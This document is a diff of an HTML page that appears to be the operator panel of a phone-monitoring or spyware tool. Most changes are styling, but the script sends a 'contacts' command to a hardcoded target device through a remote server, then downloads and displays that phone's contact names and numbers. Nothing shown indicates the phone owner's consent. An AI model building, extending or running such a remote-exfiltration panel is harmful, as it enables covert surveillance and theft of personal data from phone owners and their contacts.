@@ -11,6 +11,7 @@
             --glass-bg: #1a1a1a;
             --text-main: #ffffff;
             --accent: #4caf50;
+            --error: #ff4444;
         }
         body {
             background-color: var(--bg-color);
@@ -43,7 +44,10 @@
             padding: 15px; border-radius: 12px;
             display: flex; align-items: center; justify-content: space-between;
             border: 1px solid #333;
+            transition: 0.2s;
         }
+        .contact-card:hover { border-color: var(--accent); }
+
         .contact-left { display: flex; align-items: center; gap: 15px; }
         
         .avatar {
@@ -52,6 +56,8 @@
             border-radius: 50%;
             display: flex; align-items: center; justify-content: center;
             font-weight: bold; font-size: 1.1rem;
+            color: white;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
         }
         
         .info h3 { margin: 0; font-size: 1rem; font-weight: 500; }
@@ -59,16 +65,19 @@
 
         .action-btn {
             color: var(--accent); font-size: 1.2rem;
-            text-decoration: none; padding: 5px;
+            text-decoration: none; padding: 8px;
+            border-radius: 50%;
+            background: rgba(76, 175, 80, 0.1);
         }
 
         /* Loading & Error */
         .status-msg { text-align: center; margin-top: 50px; color: #888; }
         .refresh-btn {
             background: var(--accent); color: white; border: none;
-            padding: 10px 20px; border-radius: 20px; margin-top: 15px;
-            cursor: pointer;
+            padding: 10px 25px; border-radius: 20px; margin-top: 15px;
+            cursor: pointer; font-size: 0.9rem;
         }
+        .refresh-btn:active { transform: scale(0.95); }
     </style>
 </head>
 <body>
@@ -78,37 +87,29 @@
             <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
             <div class="title-area">
                 <h2>Contacts</h2>
-                <span class="device-tag" id="displayID">Connecting...</span>
+                <span class="device-tag">M2103K19I</span>
             </div>
         </div>
 
         <div id="contactsContainer" class="contact-list">
             <div class="status-msg">
-                <i class="fas fa-spinner fa-spin" style="font-size: 2rem;"></i>
-                <p>Requesting data from phone...</p>
+                <i class="fas fa-circle-notch fa-spin" style="font-size: 2rem; color: var(--accent);"></i>
+                <p>Connecting to Phone...</p>
             </div>
         </div>
     </div>
 
     <script>
-        // --- SMART ID LOGIC ---
-        // 1. Index page se jo ID save ki thi, use uthao
-        let TARGET_ID = localStorage.getItem("TARGET_DEVICE_ID");
-
-        // 2. Agar koi ID save nahi hai, to Logs wali ID use karo (Fallback)
-        if (!TARGET_ID || TARGET_ID === "Connecting...") {
-            TARGET_ID = "M2103K19I"; 
-        }
-
-        // Screen par ID dikhao
-        document.getElementById("displayID").innerText = TARGET_ID;
-
+        // --- SETTINGS ---
         const RENDER_URL = "https://child-v9no.onrender.com";
+        const TARGET_ID = "M2103K19I"; // Maine ID fix kar di hai
 
-        // Step 1: Page khulte hi Command bhejo
+        // Step 1: Page load hone par command bhejo
         async function init() {
+            const container = document.getElementById("contactsContainer");
+            
             try {
-                // Command bhejo: Phone ko bolo "Contacts upload karo"
+                // Command bhej rahe hain
                 console.log(`Sending command to ${TARGET_ID}...`);
                 await fetch(`${RENDER_URL}/api/send-command`, {
                     method: 'POST',
@@ -116,54 +117,61 @@
                     body: JSON.stringify({ device_id: TARGET_ID, command: 'contacts' })
                 });
 
-                // User ko update do
-                const container = document.getElementById("contactsContainer");
+                // User ko message dikhao
                 container.innerHTML = `
                     <div class="status-msg">
-                        <i class="fa-solid fa-satellite-dish"></i>
-                        <p>Command sent to ${TARGET_ID}.<br>Waiting for upload (5s)...</p>
+                        <i class="fa-solid fa-satellite-dish" style="font-size: 2rem; margin-bottom: 10px;"></i>
+                        <p>Command Sent!</p>
+                        <p style="font-size: 0.8rem; color: #666;">Waiting for phone to upload list (5s)...</p>
                     </div>
                 `;
 
-                // 5 Second ruk kar data fetch karo
+                // 5 Second wait karo fir data check karo
                 setTimeout(fetchContacts, 5000);
 
             } catch (err) {
-                document.getElementById("contactsContainer").innerHTML = `
-                    <div class="status-msg" style="color:#ff4444">
-                        <p>Server Connection Failed.</p>
+                console.error(err);
+                container.innerHTML = `
+                    <div class="status-msg" style="color: var(--error)">
+                        <i class="fa-solid fa-triangle-exclamation" style="font-size: 2rem;"></i>
+                        <p>Server Error. Check Internet.</p>
+                        <button class="refresh-btn" onclick="location.reload()">Retry</button>
                     </div>`;
             }
         }
 
-        // Step 2: Data download karke show karo
+        // Step 2: Data server se download karo
         async function fetchContacts() {
             const container = document.getElementById("contactsContainer");
             
             try {
+                console.log("Fetching data file...");
                 const response = await fetch(`${RENDER_URL}/api/get-data/${TARGET_ID}/contacts`);
                 const data = await response.json();
 
-                // Agar data khali hai ya error hai
+                // Agar data nahi aaya ya khali hai
                 if (!data || data.length === 0 || data.error) {
                     container.innerHTML = `
                         <div class="status-msg">
+                            <i class="fa-regular fa-folder-open" style="font-size: 2rem;"></i>
                             <p>No contacts received yet.</p>
+                            <p style="font-size: 0.8rem;">Phone might be slow or offline.</p>
                             <button class="refresh-btn" onclick="location.reload()">Try Again</button>
                         </div>
                     `;
                     return;
                 }
 
-                // List banao
-                container.innerHTML = ""; // Purana loading hatao
+                // Data aa gaya! List banao
+                container.innerHTML = ""; // Loading hatao
                 
                 data.forEach(contact => {
-                    // Agar naam nahi hai toh "Unknown"
+                    // Data safai
                     const name = contact.name || "Unknown";
                     const number = contact.number || "No Number";
                     const initial = name.charAt(0).toUpperCase();
 
+                    // HTML Card Template
                     const html = `
                         <div class="contact-card">
                             <div class="contact-left">
@@ -183,14 +191,14 @@
                 console.error(error);
                 container.innerHTML = `
                     <div class="status-msg">
-                        <p>Data file not found yet.</p>
+                        <p>Data file not ready.</p>
                         <button class="refresh-btn" onclick="location.reload()">Refresh</button>
                     </div>
                 `;
             }
         }
 
-        // Script chalao
+        // Start Process
         window.onload = init;
     </script>
 </body>
